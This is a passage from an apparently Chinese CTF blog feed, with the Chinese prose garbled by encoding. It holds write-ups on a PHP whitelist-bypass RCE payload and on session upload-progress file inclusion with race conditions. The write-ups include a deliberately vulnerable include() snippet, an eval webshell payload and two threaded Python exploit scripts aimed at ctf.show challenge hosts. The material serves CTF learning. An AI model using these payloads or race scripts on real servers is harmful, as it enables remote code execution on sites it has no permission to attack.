class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆæˆ‘ä»¬è¦æ„é€ çš„æ˜¯system(â€œcat /f*â€);</p><p>ç„¶åå› ä¸ºç™½åå•é‡Œåªæœ‰æ•°å­¦å‡½æ•°ã€‚é‚£ä¹ˆæˆ‘ä»¬å°è¯•æ„é€ c=$_GET[a]$_GET[b]çš„å½¢å¼è¾¾åˆ°RCEã€‚</p><p>é‚£ä¹ˆå…ˆæ„é€ _GET.å› ä¸ºæ•°å­¦å‡½æ•°æ˜¯å…è®¸çš„ï¼Œæˆ‘ä»¬åˆ©ç”¨ä¸€ä¸ªhex2binæ¥å°†_GETç”¨åå…­è¿›åˆ¶è¡¨ç¤ºå‡ºæ¥ã€‚</p><p>_GET=hex2bin(5f474554)</p><p>ä½†æ˜¯æˆ‘ä»¬çš„hex2binåˆä¸åœ¨æ‰€ç»™çš„å‡½æ•°èŒƒå›´å†…ã€‚é‚£ä¹ˆæˆ‘ä»¬ç»§ç»­å¯»æ‰¾æ˜¯å¦å­˜åœ¨å¯åˆ©ç”¨çš„å‡½æ•°ï¼Œå°†hex2binåŠ å¯†è§£ç ã€‚æˆ‘ä»¬çœ‹åˆ°ä¸€ä¸ªbase_convertå‡½æ•°ã€‚é‚£ä¹ˆå¯ä»¥è¿›è¡Œä¸€ä¸ªè½¬æ¢ã€‚</p><p>åœ¨è¿›åˆ¶è½¬æ¢ä¸­æ‰¾åˆ°åªæœ‰36è¿›åˆ¶çš„æ‰ä¸ä¼šè½¬ç åçš„ä¸¢å¤±ã€‚é‚£ä¹ˆæˆ‘ä»¬åˆ©ç”¨base_convert(10,36)</p><p>å³payload:base_convert(37907361743,10,36)(5f474554)â€“&gt;hex2bin(5f474554)â€”&gt;_GET</p><p>å› ä¸º5f474554æ˜¯ä¸èƒ½ç›´æ¥åŒ¹é…çš„ã€‚é‚£ä¹ˆæˆ‘ä»¬è¿˜éœ€è¦ä¸€ä¸ªå‡½æ•°dechex(1598506324)=5f474554</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload:?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi&#123;max&#125;($$pi&#123;min&#125;);&amp;max=system&amp;min=cat flag.php</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> CTF-web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFä¸­Sessionæ–‡ä»¶åŒ…å«ä¸æ¡ä»¶ç«äº‰</title>
      <link href="/2021/09/16/CTF%E4%B8%ADSession%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%8E%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89-cnblog/"/>
      <url>/2021/09/16/CTF%E4%B8%ADSession%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%8E%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89-cnblog/</url>
      
        <content type="html"><![CDATA[<h1 id="CTFä¸­Sessionæ–‡ä»¶åŒ…å«ä¸æ¡ä»¶ç«äº‰"><a href="#CTFä¸­Sessionæ–‡ä»¶åŒ…å«ä¸æ¡ä»¶ç«äº‰" class="headerlink" title="CTFä¸­Sessionæ–‡ä»¶åŒ…å«ä¸æ¡ä»¶ç«äº‰"></a>CTFä¸­Sessionæ–‡ä»¶åŒ…å«ä¸æ¡ä»¶ç«äº‰</h1><p>è®°å¾—2021ciscnå›½èµ›åˆèµ›ç»™äº†ä¸€é“sessionç«äº‰çš„é¢˜ç›®ã€‚ä¸Šæ¬¡CTFSHOW åƒç“œæ¯ä¹Ÿåšåˆ°äº†sessionæ¡ä»¶ç«äº‰ã€‚è¿™æ¬¡2021ç¥¥äº‘æ¯åˆå‡ºäº†è¿™ä¸ªè€ƒç‚¹ã€‚ä¸‰æ¬¡éƒ½æ²¡åšå‡ºæ¥ã€‚å˜»å˜»å˜»!ğŸ¤­ã€‚æ‰€ä»¥ä»Šå¤©å†³å®šèŠ±æ—¶é—´æŠŠè¿™ä¸ªè€ƒç‚¹ææ¸…é™¤ï¼Œæ•´æ˜ç™½ã€‚</p><p>##sessionçŸ¥è¯†ç‚¹</p><p>ä¼—æ‰€å‘¨çŸ¥ï¼Œsessionæ˜¯ä¼šå‡ºç°åœ¨æˆ‘ä»¬çš„cookieå½“ä¸­ã€‚ä½œä¸ºä¸€ç§ç”¨æˆ·å‡­è¯ã€‚åœ¨PHP 5.4ä»¥ä¸Šçš„ç‰ˆæœ¬ï¼Œsessionä¸­å¤šäº†ä¸€ä¸ªè®°å½•æ–‡ä»¶ä¸Šä¼ è¿›åº¦çš„åŠŸèƒ½ã€‚é‚£ä¹ˆç°åœ¨è¯´ä¸€ä¸‹å¦‚æœè¦åˆ©ç”¨æ¡ä»¶ç«äº‰ï¼Œéœ€è¦çš„å‡ ä¸ªå¿…å¤‡æ¡ä»¶ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">session.upload_progress.enabled = on:è¯¥å‚æ•°è®¾ç½®ä¸ºOnæ—¶ï¼Œæ‰ä¼šè¿›è¡Œæ–‡ä»¶ä¸Šä¼ è¿›åº¦çš„è®°å½•ã€‚</span><br><span class="line"></span><br><span class="line">session.upload_progress.cleanup = on:è¯¥å‚æ•°å¼€å¯æ—¶ï¼Œä¼šåœ¨æ–‡ä»¶ä¸Šä¼ ç»“æŸæ—¶å¯¹ç”¨æˆ·sessionå†…å®¹è¿›è¡Œè‡ªåŠ¨æ¸…é™¤ã€‚</span><br><span class="line"></span><br><span class="line">session.upload_progress.name = <span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>:è¯¥å‚æ•°ä¸prefixä½œä¸ºæˆ‘ä»¬çš„é”®åã€‚æ–¹ä¾¿æˆ‘ä»¬çš„shellç¼–å†™ï¼Œå¯æ§ã€‚</span><br><span class="line"></span><br><span class="line">session.upload_progress.prefix = <span class="string">&quot;upload_progress_&quot;</span>:è¯¥å‚æ•°è¡¨ç¤ºä¸nameä¸€èµ·æ„æˆæˆ‘ä»¬çš„é”®åã€‚</span><br></pre></td></tr></table></figure><h2 id="æœ¬åœ°å¤ç°æ­å»º"><a href="#æœ¬åœ°å¤ç°æ­å»º" class="headerlink" title="æœ¬åœ°å¤ç°æ­å»º"></a>æœ¬åœ°å¤ç°æ­å»º</h2><h3 id="å…³é—­cleanup"><a href="#å…³é—­cleanup" class="headerlink" title="å…³é—­cleanup"></a>å…³é—­cleanup</h3><p>ä¸ºäº†å¯¹è¯¥çŸ¥è¯†ç‚¹æœ‰ä¸€ä¸ªåˆæ­¥è®¤è¯†ï¼Œæˆ‘ä»¬å…ˆåšä¸€ä¸ªéš¾åº¦ä¸å¤§çš„ã€‚å…ˆå°†session.upload_progress.cleanup = Offã€‚è¿™æ ·æˆ‘ä»¬ä¸Šä¼ çš„ä¸œè¥¿ä¸ä¼šåˆ </p><p>ä¿®æ”¹php.iniçš„æ–¹æ³•ï¼šå°†æœ€å‰é¢çš„åˆ†å·æ›¿æ¢ä¸ºç©ºæ ¼å³å¯ã€‚æ³¨æ„ä¸€å®šè¦æœ‰ç©ºæ ¼ã€‚</p><p>æœ¬åœ°åˆ›å»ºä¸€ä¸ªSession_Test.phpã€‚åŠ å…¥å¦‚ä¸‹ä»£ç ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[file];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br></pre></td></tr></table></figure><p>æ·»åŠ cookie:PHPSESSID=k1he åˆ·æ–°åä¼šå‘ç°æˆ‘ä»¬çš„sessionå­˜æ”¾ç›®å½•ä¸‹å¤šäº†ä¸€ä¸ªsess_k1heã€‚<img "" class="lazyload placeholder" data-original="https://i.loli.net/2021/09/16/A2OY1zBEvbkFxfe.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210916204813648"></p><p>å¯ä»¥å‘ç°é‡Œé¢ä»€ä¹ˆå†…å®¹éƒ½æ²¡æœ‰ã€‚ç°åœ¨æˆ‘ä»¬åˆ©ç”¨postä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ï¼Œè®©é‡Œé¢æœ‰ä¸œè¥¿ã€‚</p><p><img "" class="lazyload placeholder" data-original="https://i.loli.net/2021/09/16/r8pwjXHNlUAQnoO.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210916204800558"></p><p>æˆ‘ä»¬æˆªå–ä¸€ä¸ªè¡¨å•ä¸Šä¼ æ–‡ä»¶çš„é¡µé¢ã€‚å¯ä»¥å‘å…ˆè¡¨å•ä¸Šä¼ æ–‡ä»¶æ—¶æœ‰å‡ ä¸ªé‡ç‚¹</p><p>æœ‰äº†è¿™ä¸ªæ•°æ®ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç”¨pythonæ¨¡æ‹ŸPostä¸Šä¼ æ–‡ä»¶ã€‚è¿›è€Œè¾¾åˆ°shellçš„å†™å…¥ã€‚</p><p>è¿™é‡Œå†è´´ä¸€ä¸ªä¸Šä¼ è¡¨å•çš„æ ¼å¼ä¸ä¸Šä¼ åçš„ç»“æœ</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// PHPSESSION = test</span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;upload.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span> /&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file1&quot;</span> /&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file2&quot;</span> /&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img "" class="lazyload placeholder" data-original="https://i.loli.net/2021/09/16/aXwqtGfgZ2UdbI8.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210916204746218"></p><p>å¯ä»¥çœ‹è§ä¸Šä¼ åæˆ‘ä»¬çš„upload_progress_123 è¿™é‡Œ123æ˜¯æˆ‘ä»¬å¯æ§çš„ã€‚é‚£ä¹ˆæˆ‘ä»¬åªç”¨postæˆ‘ä»¬éœ€è¦çš„å‚æ•°å³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cookie = &#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:sessid&#125;,</span><br><span class="line">data = &#123;<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>:<span class="string">&quot;&lt;?php eval($_POST[1]);?&gt;&quot;</span>&#125;,</span><br><span class="line">files = &#123;<span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;k1he.txt&#x27;</span>,f)&#125;</span><br><span class="line">è¿™æ ·å°±èƒ½æ¨¡æ‹Ÿæˆ‘ä»¬çš„postæ–‡ä»¶ä¸Šä¼ äº†ã€‚</span><br></pre></td></tr></table></figure><p>ä¸Šä¼ æ–‡ä»¶åï¼Œé‡Œé¢ä¼šæœ‰åºåˆ—åŒ–åçš„æˆ‘ä»¬çš„dataå†…å®¹ã€‚</p><p>è¿™æ—¶å€™ï¼Œæˆ‘ä»¬å†åŒ…å«è¿™ä¸ªsessionæ–‡ä»¶ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥RCEäº†ã€‚</p><h3 id="å¼€å¯cleanup"><a href="#å¼€å¯cleanup" class="headerlink" title="å¼€å¯cleanup"></a>å¼€å¯cleanup</h3><p>å¼€å¯cleanupåï¼Œæˆ‘ä»¬çš„æ–‡ä»¶ä¸Šä¼ å®Œæ¯•åï¼Œä¼šå¯¹æˆ‘ä»¬sessionæ–‡ä»¶é‡Œçš„å†…å®¹å…¨éƒ¨åˆ é™¤ã€‚è¿™æ—¶å€™æˆ‘ä»¬å°±éœ€è¦åˆ©ç”¨æ¡ä»¶ç«äº‰ã€‚ä¸€ç›´ä¸åœçš„ä¸Šä¼ æ–‡ä»¶ï¼Œä»è€Œä½¿æˆ‘ä»¬çš„å†…å®¹æ¥ä¸åŠåˆ é™¤ï¼Œä»è€Œè¢«æˆ‘ä»¬åˆ©ç”¨ã€‚å¹¶ä¸”ä½¿ç”¨åŒçº¿ç¨‹</p><h2 id="é¢˜ç›®å¤ç°"><a href="#é¢˜ç›®å¤ç°" class="headerlink" title="é¢˜ç›®å¤ç°"></a>é¢˜ç›®å¤ç°</h2><h3 id="å…ˆæ•´ä¸ªç®€å•çš„-ctfshow-webå…¥é—¨-82-86-é€šæ€è„šæœ¬"><a href="#å…ˆæ•´ä¸ªç®€å•çš„-ctfshow-webå…¥é—¨-82-86-é€šæ€è„šæœ¬" class="headerlink" title="å…ˆæ•´ä¸ªç®€å•çš„ ctfshow webå…¥é—¨ 82~86 é€šæ€è„šæœ¬"></a>å…ˆæ•´ä¸ªç®€å•çš„ ctfshow webå…¥é—¨ 82~86 é€šæ€è„šæœ¬</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹è§æ˜¯ä¸€ä¸ªæ–‡ä»¶åŒ…å«é¢˜ç›®ï¼Œå°†ä¼ªåè®®è¿‡æ»¤å®Œäº†ã€‚é€šè¿‡cookieå‘ç°å­˜åœ¨sessionã€‚é‚£ä¹ˆè€ƒè™‘sessionæ–‡ä»¶åŒ…å«ã€‚</p><h4 id="ä¸€èˆ¬sessionçš„å­˜æ”¾ä½ç½®"><a href="#ä¸€èˆ¬sessionçš„å­˜æ”¾ä½ç½®" class="headerlink" title="ä¸€èˆ¬sessionçš„å­˜æ”¾ä½ç½®"></a>ä¸€èˆ¬sessionçš„å­˜æ”¾ä½ç½®</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/<span class="keyword">var</span>/lib/php/</span><br><span class="line">/<span class="keyword">var</span>/lib/php/sessions/</span><br><span class="line">/tmp/</span><br><span class="line">/tmp/sessions/</span><br><span class="line">æœ¬é¢˜å‹ä¸€å¾‹é‡‡ç”¨/tmp/å½¢å¼</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆç›´æ¥é€‰æ‹©ä½¿ç”¨è„šæœ¬:æˆ‘æ˜¯å…ˆlsä¸€ä¸‹ï¼Œå†ä½¿ç”¨è„šæœ¬æ‹¿flagã€‚è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼š</p><p>æˆ‘ä»¬æ‹¿åˆ°çš„æ•°æ®é•¿è¿™æ ·ã€‚å‰é¢è®²è¿‡äº†ï¼Œæˆ‘ä»¬çš„é”®åçš„æ ¼å¼å°±æ˜¯upload_progress_+æ•°æ®ä¸¤ä¸ªéƒ¨åˆ†</p><p><img "" class="lazyload placeholder" data-original="https://i.loli.net/2021/09/16/LycrhM3Qng5tuSq.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210916204720957"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="comment"># @Author: k1he</span></span><br><span class="line"><span class="comment"># @Date:   2021-08-23 18:08:10</span></span><br><span class="line"><span class="comment"># @Last Modified by:   k1he</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2021-08-23 20:19:18</span></span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">sessid = <span class="string">&#x27;k1he&#x27;</span></span><br><span class="line">url = <span class="string">&#x27;http://a0c9ce43-6c4d-4b28-aa61-1c7a6eb40879.challenge.ctf.show:8080/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> event.isSet():</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span>* <span class="number">1024</span> * <span class="number">50</span>)                     <span class="comment">#åˆ›å»ºæ–‡ä»¶</span></span><br><span class="line">        response = session.post(                            <span class="comment">#postæ–‡ä»¶ä¸Šä¼ </span></span><br><span class="line">            url,                                            <span class="comment">#url</span></span><br><span class="line">            cookies = &#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:sessid&#125;,                   <span class="comment">#è®¾ç½®cookieä¸ºæˆ‘ä»¬çš„sessid</span></span><br><span class="line">            data = &#123; <span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>:<span class="string">&quot;&lt;?php system(&#x27;cat *fl0g.php&#x27;);?&gt;&quot;</span>&#125;,<span class="comment">#å†™é©¬æˆ–æ‰§è¡Œå†…å®¹</span></span><br><span class="line">            files = &#123;<span class="string">&quot;file&quot;</span>:(<span class="string">&#x27;k1he.txt&#x27;</span>,f)&#125;                 <span class="comment">#ä¸Šä¼ æ–‡çš„å…·ä½“å†…å®¹ï¼Œæ–‡ä»¶åå’Œæ–‡ä»¶å†…å®¹</span></span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> event.isSet():</span><br><span class="line">        payload = <span class="string">&quot;?file=/tmp/sess_&quot;</span>+sessid                 <span class="comment">#åŒ…å«æˆ‘ä»¬çš„sessionè·¯å¾„</span></span><br><span class="line"></span><br><span class="line">        response = session.get(url = url+payload)           <span class="comment">#è¯»å–é¡µé¢</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;k1he.txt&#x27;</span> <span class="keyword">in</span> response.text:                     <span class="comment">#è¿”å›é¡µé¢</span></span><br><span class="line">            <span class="built_in">print</span>(response.text)</span><br><span class="line">            event.clear</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[*]retrying!!!&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:                                  <span class="comment">#åŒçº¿ç¨‹è¿è¡Œ</span></span><br><span class="line">    event = threading.Event()</span><br><span class="line">    event.<span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=write,args=(session,)).start()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read,args=(session,)).start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="ctfshow-web-150plus-è¿™é‡Œæ˜¯éé¢„æœŸï¼Œé¢„æœŸè§£æˆ‘ä¸ä¼šå˜»å˜»å˜»ã€‚"><a href="#ctfshow-web-150plus-è¿™é‡Œæ˜¯éé¢„æœŸï¼Œé¢„æœŸè§£æˆ‘ä¸ä¼šå˜»å˜»å˜»ã€‚" class="headerlink" title="ctfshow web 150plus:è¿™é‡Œæ˜¯éé¢„æœŸï¼Œé¢„æœŸè§£æˆ‘ä¸ä¼šå˜»å˜»å˜»ã€‚"></a>ctfshow web 150plus:è¿™é‡Œæ˜¯éé¢„æœŸï¼Œé¢„æœŸè§£æˆ‘ä¸ä¼šå˜»å˜»å˜»ã€‚</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="comment"># @Author: k1he</span></span><br><span class="line"><span class="comment"># @Date:   2021-08-23 18:08:10</span></span><br><span class="line"><span class="comment"># @Last Modified by:   k1he</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2021-08-23 20:34:04</span></span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">sessid = <span class="string">&#x27;k1he&#x27;</span></span><br><span class="line">url = <span class="string">&#x27;http://522d8444-7909-4206-af01-bc1257b3c59d.challenge.ctf.show:8080/?isVIP=1&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> event.isSet():</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span>* <span class="number">1024</span> * <span class="number">50</span>)                     <span class="comment">#åˆ›å»ºæ–‡ä»¶</span></span><br><span class="line">        response = session.post(                            <span class="comment">#postæ–‡ä»¶ä¸Šä¼ </span></span><br><span class="line">            url,                                            <span class="comment">#url</span></span><br><span class="line">            cookies = &#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:sessid&#125;,                   <span class="comment">#è®¾ç½®cookieä¸ºæˆ‘ä»¬çš„sessid</span></span><br><span class="line">            data = &#123; <span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>:<span class="string">&quot;&lt;?php system(&#x27;cat flag.php&#x27;);?&gt;&quot;</span>&#125;,<span class="comment">#å†™é©¬æˆ–æ‰§è¡Œå†…å®¹</span></span><br><span class="line">            files = &#123;<span class="string">&quot;file&quot;</span>:(<span class="string">&#x27;k1he.txt&#x27;</span>,f)&#125;                 <span class="comment">#ä¸Šä¼ æ–‡çš„å…·ä½“å†…å®¹ï¼Œæ–‡ä»¶åå’Œæ–‡ä»¶å†…å®¹</span></span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> event.isSet():</span><br><span class="line">        data =&#123;</span><br><span class="line">            <span class="string">&#x27;ctf&#x27;</span>:<span class="string">&quot;/tmp/sess_&quot;</span>+sessid </span><br><span class="line">        &#125;</span><br><span class="line">                         <span class="comment">#åŒ…å«æˆ‘ä»¬çš„sessionè·¯å¾„</span></span><br><span class="line"></span><br><span class="line">        response = session.post(url = url,data =data)           <span class="comment">#è¯»å–é¡µé¢</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;k1he.txt&#x27;</span> <span class="keyword">in</span> response.text:                     <span class="comment">#è¿”å›é¡µé¢</span></span><br><span class="line">            <span class="built_in">print</span>(response.text)</span><br><span class="line">            event.clear</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[*]retrying!!!&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:                                  <span class="comment">#åŒçº¿ç¨‹è¿è¡Œ</span></span><br><span class="line">    event = threading.Event()</span><br><span class="line">    event.<span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=write,args=(session,)).start()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read,args=(session,)).start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>â€‹    </p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF-web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFSHOW-PHPç‰¹æ€§</title>
      <link href="/2021/09/16/CTFSHOW_PHP%E7%89%B9%E6%80%A7/"/>
      <url>/2021/09/16/CTFSHOW_PHP%E7%89%B9%E6%80%A7/</url>
      
